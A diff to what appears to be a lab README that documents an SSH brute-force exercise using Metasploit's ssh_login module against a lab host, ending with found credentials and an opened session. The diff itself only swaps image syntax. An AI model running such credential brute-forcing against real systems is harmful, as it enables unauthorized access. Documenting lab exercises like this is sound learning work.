@@ -13,7 +13,7 @@
 ```bash
 service ssh status
 ```
-![SSH service status](./screenshots/01_ssh_service_status.png)
+<img src="./screenshots/01_ssh_service_status.png" alt="User/Pass file created" width="600">
 
 ### 2. Created users and passwords files
 ```bash
@@ -34,20 +34,20 @@ Files Content:
 ```bash
 msfconsole
 ```
-![Metasploit launched](./screenshots/03_msfconsole.png)
+<img src="./screenshots/03_msfconsole.png" alt="User/Pass file created" width="600">
 
 ### 4. Searched for SSH modules
 ```bash
 search ssh
 ```
-![SSH modules search](./screenshots/04_search_ssh.png)
+<img src="./screenshots/04_search_ssh.png" alt="User/Pass file created" width="600">
 
 ### 5. Selected ssh_login module
 ```bash
 use 0 
 show options
 ```
-![ssh_login config](./screenshots/05_ssh_login_config.png)
+<img src="./screenshots/05_ssh_login_config.png" alt="User/Pass file created" width="600">
 
 ### 6. Configured and ran brute-force attack
 ```bash
@@ -56,7 +56,7 @@ set PASS_FILE pass.txt
 set RHOSTS 192.168.56.6
 run
 ```
-![Brute-force running](./screenshots/06_bruteforce_attempt.png)
+<img src="./screenshots/06_bruteforce_attempt.png" alt="User/Pass file created" width="600">
 
 ### Result:
 Valid credentials found:
@@ -64,4 +64,4 @@ Valid credentials found:
 Success: 'vagrant':'vagrant'
 Session 1 opened
 ```
-![Successful login](./screenshots/07_successful_login.png)
+<img src="./screenshots/07_successful_login.png" alt="User/Pass file created" width="600">
